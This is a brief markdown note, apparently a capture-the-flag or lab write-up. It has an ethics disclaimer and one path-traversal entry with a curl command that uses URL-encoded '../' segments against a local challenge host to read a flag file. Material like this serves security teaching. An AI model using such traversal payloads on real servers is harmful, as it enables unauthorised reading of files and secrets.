# Ethical Considerations
Remember that hacking into devices without permission is illegal and unethical.\
Always ensure you have the necessary permissions and are conducting these activities in a\
controlled environment for educational or security assessment purposes.

# Web Security
## Content injections

<details>
<summary style="cursor:pointer">Path traversal 1</summary>

- check the /challenge/server with cat for the correct URL ending
- "..%2F" is URL-encoding of "../"
  
```bash
curl -v http://challenge.localhost:80/CHECK-URL/..%2F..%2Fflag
```

</details>

